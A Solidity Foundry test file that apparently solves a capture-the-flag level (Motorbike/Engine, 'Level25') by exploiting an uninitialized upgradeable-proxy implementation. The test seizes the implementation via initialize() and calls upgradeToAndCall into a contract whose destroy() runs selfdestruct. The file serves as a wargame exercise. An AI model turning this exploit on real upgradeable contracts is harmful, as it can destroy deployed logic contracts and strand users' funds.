// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../instance/Level25.sol";

contract ExploitLevel25 is Test {
    Engine engineContract = new Engine();
    Motorbike motorbikeContract = new Motorbike(address(engineContract));
    address attacker = vm.addr(1);

    function testExploit() external {
        vm.deal(attacker, 1 ether);
        AttackLevel attackContract = new AttackLevel();
        bytes memory dataContent = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", address(attackContract), abi.encodeWithSignature("destroy()")
        );

        vm.startPrank(attacker);
        engineContract.initialize();
        engineContract.upgradeToAndCall(address(attackContract), abi.encodeWithSignature("destroy()"));
        // (bool success,) = address(motorbikeContract).call{value: 1 wei}(dataContent);
        // require(success, "call() Failed");
        vm.stopPrank();
    }
}

contract AttackLevel {
    function destroy() external payable {
        console.log("Contract destroyed");
        selfdestruct(address(0));
    }
}
